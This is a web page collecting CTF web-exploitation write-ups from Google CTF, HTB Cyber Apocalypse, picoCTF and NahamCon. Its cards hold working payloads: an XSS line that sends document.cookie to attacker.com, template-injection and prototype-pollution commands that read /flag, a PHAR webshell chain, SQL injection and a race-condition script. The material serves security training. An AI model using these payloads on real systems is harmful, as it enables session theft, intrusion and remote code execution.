---
layout: page
title: Web Exploitation Challenges
subtitle: CTF web challenge writeups by event and year
permalink: /ctf/challenges/web/
---

<p class="page-lead">Web exploitation writeups from Google CTF, HTB Cyber Apocalypse, DEF CON, NahamCon, picoCTF, and more. Organized by year and event.</p>

<div class="challenge-year-nav">
  <button class="mf-btn active" data-filter="all">All Years</button>
  <button class="mf-btn" data-filter="2025">2025</button>
  <button class="mf-btn" data-filter="2024">2024</button>
  <button class="mf-btn" data-filter="2023">2023</button>
  <button class="mf-btn" data-filter="2022">2022</button>
</div>

---

## 2025 Challenges

### Google CTF 2025

<div class="challenge-cards-list">

  <div class="challenge-card" data-year="2025" data-event="google">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge google">Google CTF 2025</span>
        <h4 class="cc-name">QUOTA</h4>
      </div>
      <span class="cc-diff hard">Hard</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Web · <strong>Points</strong>: 492 · <strong>Solves</strong>: 14</p>
      <p class="cc-desc">Race condition in API quota enforcement allows exceeding rate limits and triggering a privileged code path that leaks the flag from a server-side object store.</p>
      <div class="cc-tags"><span>Race Condition</span><span>API Abuse</span><span>Timing Attack</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <p>1. Identify the quota check: <code>GET /api/resource</code> validates rate limit before serving data.</p>
          <p>2. Race 50 simultaneous requests within one second using Python's <code>asyncio</code>.</p>
          <p>3. The server's check-then-use gap (TOCTOU) allows ~3 requests past the limit.</p>
          <p>4. At 3x over-quota, the server falls back to a debug response containing the flag.</p>
          <pre><code>import asyncio, httpx

async def race():
    async with httpx.AsyncClient() as c:
        tasks = [c.get("https://quota.ctf.google.com/api/resource", 
                        headers={"Cookie": "session=YOURTOKEN"}) 
                 for _ in range(50)]
        results = await asyncio.gather(*tasks)
        for r in results:
            if "CTF{" in r.text:
                print(r.text)

asyncio.run(race())</code></pre>
        </div>
      </details>
    </div>
  </div>

  <div class="challenge-card" data-year="2025" data-event="google">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge google">Google CTF 2025</span>
        <h4 class="cc-name">NOTENINJA</h4>
      </div>
      <span class="cc-diff medium">Medium</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Web · <strong>Points</strong>: 238 · <strong>Solves</strong>: 67</p>
      <p class="cc-desc">Stored XSS in a note-sharing app with CSP bypass via JSONP endpoint. Admin bot visits shared notes — steal admin cookie via a JSONP callback to an actor-controlled server.</p>
      <div class="cc-tags"><span>Stored XSS</span><span>CSP Bypass</span><span>JSONP</span><span>Cookie Theft</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <p>1. Note content is reflected into the DOM without sanitization.</p>
          <p>2. CSP: <code>script-src 'self' *.googleapis.com</code> — JSONP via googleapis.com allowed.</p>
          <p>3. Payload: <code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?token=fetch('https://attacker.com/?c='+document.cookie)"&gt;&lt;/script&gt;</code></p>
          <p>4. Submit note URL to admin bot → receive admin session cookie.</p>
        </div>
      </details>
    </div>
  </div>

</div>

### HTB Cyber Apocalypse 2025

<div class="challenge-cards-list">

  <div class="challenge-card" data-year="2025" data-event="htb">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge htb">HTB Cyber Apocalypse 2025</span>
        <h4 class="cc-name">Lucky Faucet</h4>
      </div>
      <span class="cc-diff easy">Easy</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Web · <strong>Points</strong>: 325 · <strong>Solves</strong>: 312</p>
      <p class="cc-desc">Flask app with a predictable random seed based on server timestamp. Predict the "lucky number" to bypass authentication and claim the flag.</p>
      <div class="cc-tags"><span>Weak Randomness</span><span>Python Flask</span><span>Timestamp Seed</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <pre><code>import random, time, requests

# Sync time with server
r = requests.get("http://target/")
server_time = int(r.headers.get('Date', '').split(' ')[4].split(':')[0])

# Brute nearby timestamps
for ts in range(server_time - 10, server_time + 10):
    random.seed(ts)
    guess = random.randint(1, 1000000)
    r = requests.post("http://target/guess", json={"number": guess})
    if "HTB{" in r.text:
        print(r.text)
        break</code></pre>
        </div>
      </details>
    </div>
  </div>

  <div class="challenge-card" data-year="2025" data-event="htb">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge htb">HTB Cyber Apocalypse 2025</span>
        <h4 class="cc-name">HateCTF</h4>
      </div>
      <span class="cc-diff hard">Hard</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Web · <strong>Points</strong>: 482 · <strong>Solves</strong>: 22</p>
      <p class="cc-desc">PHP PHAR deserialization attack via a file manager. Upload a PHAR disguised as an image, trigger deserialization via a custom POP chain to achieve RCE.</p>
      <div class="cc-tags"><span>PHP Deserialization</span><span>PHAR</span><span>POP Chain</span><span>RCE</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <p>1. Source review: <code>file_exists("phar://...")</code> call is reachable.</p>
          <p>2. Build POP chain: <code>Logger::__destruct()</code> → <code>FileWriter::write()</code> → writes webshell.</p>
          <p>3. Generate PHAR with forged GIF header: <code>GIF89a</code> prefix passes MIME check.</p>
          <p>4. Upload file → trigger via <code>file_exists('phar://uploads/evil.gif/test')</code>.</p>
          <p>5. Webshell dropped → RCE → flag at <code>/flag</code>.</p>
        </div>
      </details>
    </div>
  </div>

</div>

---

## 2024 Challenges

### Google CTF 2024

<div class="challenge-cards-list">

  <div class="challenge-card" data-year="2024" data-event="google">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge google">Google CTF 2024</span>
        <h4 class="cc-name">SAPPY</h4>
      </div>
      <span class="cc-diff medium">Medium</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Web · <strong>Points</strong>: 267 · <strong>Solves</strong>: 54</p>
      <p class="cc-desc">Prototype pollution in a Node.js JSON merge function allows injecting arbitrary properties into <code>Object.prototype</code>, which then gets picked up by a template engine executing as admin.</p>
      <div class="cc-tags"><span>Prototype Pollution</span><span>Node.js</span><span>Template Engine RCE</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <pre><code># Payload in the merge body:
POST /api/merge HTTP/1.1
Content-Type: application/json

{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('cat /flag').toString()"}}}
</code></pre>
        </div>
      </details>
    </div>
  </div>

  <div class="challenge-card" data-year="2024" data-event="google">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge google">Google CTF 2024</span>
        <h4 class="cc-name">GPUSHOP</h4>
      </div>
      <span class="cc-diff medium">Medium</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Web · <strong>Points</strong>: 253 · <strong>Solves</strong>: 62</p>
      <p class="cc-desc">GraphQL introspection reveals hidden admin mutations. Integer overflow in the price field allows purchasing a $999 GPU for $-1 (negative price billing).</p>
      <div class="cc-tags"><span>GraphQL</span><span>Integer Overflow</span><span>Business Logic</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <pre><code>mutation {
  purchaseItem(itemId: "GPU_4090", quantity: 2147483647) {
    receipt
    flag
  }
}</code></pre>
          <p>Integer overflow on <code>quantity * price</code> wraps to negative → balance check passes.</p>
        </div>
      </details>
    </div>
  </div>

</div>

### picoCTF 2024

<div class="challenge-cards-list">

  <div class="challenge-card" data-year="2024" data-event="pico">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge pico">picoCTF 2024</span>
        <h4 class="cc-name">WebDecode</h4>
      </div>
      <span class="cc-diff easy">Easy</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Web · <strong>Points</strong>: 100 · <strong>Solves</strong>: 8,421</p>
      <p class="cc-desc">Flag hidden as a Base64-encoded <code>data-</code> attribute in the HTML source. Inspect → decode → flag.</p>
      <div class="cc-tags"><span>Source Review</span><span>Base64</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <pre><code>curl -s http://target/ | grep 'data-' | base64 -d</code></pre>
        </div>
      </details>
    </div>
  </div>

  <div class="challenge-card" data-year="2024" data-event="pico">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge pico">picoCTF 2024</span>
        <h4 class="cc-name">SQL Direct</h4>
      </div>
      <span class="cc-diff easy">Easy</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Web · <strong>Points</strong>: 200 · <strong>Solves</strong>: 5,100</p>
      <p class="cc-desc">PostgreSQL login form with no input sanitization. Classic UNION-based SQL injection to dump the flags table.</p>
      <div class="cc-tags"><span>SQLi</span><span>UNION</span><span>PostgreSQL</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <pre><code>' UNION SELECT flag,null FROM flags--</code></pre>
        </div>
      </details>
    </div>
  </div>

</div>

---

## 2023 Challenges

### NahamCon CTF 2023

<div class="challenge-cards-list">

  <div class="challenge-card" data-year="2023" data-event="naham">
    <div class="cc-header">
      <div class="cc-title-area">
        <span class="cc-event-badge naham">NahamCon 2023</span>
        <h4 class="cc-name">Stickers</h4>
      </div>
      <span class="cc-diff medium">Medium</span>
    </div>
    <div class="cc-body">
      <p><strong>Category</strong>: Web · <strong>Points</strong>: 497 · <strong>Solves</strong>: 88</p>
      <p class="cc-desc">SSTI in a Python/Flask sticker generator. User input rendered directly via Jinja2 template without sanitization → OS command execution via <code>__import__</code>.</p>
      <div class="cc-tags"><span>SSTI</span><span>Jinja2</span><span>Flask</span><span>RCE</span></div>
    </div>
    <div class="cc-solution">
      <details>
        <summary>View Approach</summary>
        <div class="cc-solution-body">
          <pre><code>{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}</code></pre>
        </div>
      </details>
    </div>
  </div>

</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
  document.querySelectorAll('.mf-btn').forEach(btn => {
    btn.addEventListener('click', function() {
      const filter = this.dataset.filter;
      document.querySelectorAll('.mf-btn').forEach(b => b.classList.remove('active'));
      this.classList.add('active');
      document.querySelectorAll('.challenge-card').forEach(card => {
        card.style.display = (filter === 'all' || card.dataset.year === filter) ? 'block' : 'none';
      });
    });
  });
});
</script>
